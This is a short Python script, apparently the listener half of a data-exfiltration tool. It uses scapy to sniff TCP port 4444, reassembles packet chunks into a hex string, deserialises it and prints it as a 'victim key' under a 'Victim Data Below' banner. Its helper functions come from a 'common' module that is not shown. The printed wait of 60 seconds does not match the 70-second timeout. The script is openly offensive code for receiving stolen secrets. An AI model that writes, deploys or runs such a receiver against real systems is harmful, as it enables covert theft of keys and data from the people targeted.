#!/usr/bin/env python3
from scapy import interfaces
from scapy.all import *
from common import *


if __name__ == "__main__":
    print("Listening for packets for 60 seconds...")
    packets = sniff(filter="tcp port 4444", timeout=70, iface="ens33")
    print(f"Received {len(packets)} chunks of data. Reconstructing...")
    reconstructed_hex_string = reconstruct_hex_string(packets)
    reconstructed_victim_key = deser_data(reconstructed_hex_string)
    print("######### Victim Data Below #########")
    print(reconstructed_victim_key)

